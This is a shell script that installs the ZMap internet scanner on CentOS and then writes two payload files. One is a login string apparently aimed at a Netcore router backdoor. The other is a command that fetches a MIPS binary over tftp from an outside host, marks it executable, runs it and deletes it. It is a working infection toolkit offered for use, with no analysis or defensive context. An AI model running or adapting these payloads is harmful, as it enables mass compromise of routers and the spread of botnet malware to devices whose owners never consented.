#!/bin/sh
# CentOS ZMap Install

yum update -y
yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
yum install epel-release -y
yum install gengetopt -y

wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz
tar -xvf v2.1.0.tar.gz
cd zmap-2.1.0
flex -o "src/lexer.c" --header-file="src/lexer.h" "src/lexer.l"
byacc -d -o "src/parser.c" "src/parser.y"
mkdir /etc/zmap
cp conf/* /etc/zmap
cmake -DENABLE_HARDENING=ON
make
make install

python -c "print 'A'*8 + 'netcore\x00'" > loginpayload
python -c "print 'AA\x00\x00AAAA cd /var/; tftp -g -r mipselss 1.1.1.1; chmod 777 mipsel; ./mipsel; rm -rf mipsel\x00'" > commandpayload
